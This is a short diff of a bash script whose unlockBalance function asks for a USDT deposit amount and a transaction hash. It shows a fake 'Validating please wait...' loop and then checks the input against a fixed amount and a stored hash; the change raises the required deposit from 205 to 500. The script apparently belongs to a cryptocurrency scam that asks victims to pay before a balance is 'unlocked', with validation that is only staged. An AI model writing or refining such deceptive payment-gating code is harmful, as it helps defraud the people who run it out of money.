@@ -30,13 +30,13 @@ function unlockBalance {
     read -p "Enter your deposit amount in USDT: " depositAmount
     read -p "Enter the transaction hash ID: " transactionHash
 	
-    echo " "
+echo " "
     for ((i=1; i<=15; i++)); do
         echo -e " \e[32mValidating please wait...\e[0m"
         sleep 0.5
     done
     echo " "
-    if [[ $depositAmount -eq 205 && $transactionHash == "$hash_id" ]]; then
+    if [[ $depositAmount -eq 500 && $transactionHash == "$hash_id" ]]; then
         refresh
         selectNetwork
     else
@@ -49,7 +49,7 @@ function unlockBalance {
 }
 function selectNetwork {
 #    echo -e "$usdt_logo"
-    echo "Select network:"
+echo "Select network:"
     echo " "
     echo "1. TRC20"
     echo "2. ERC20"
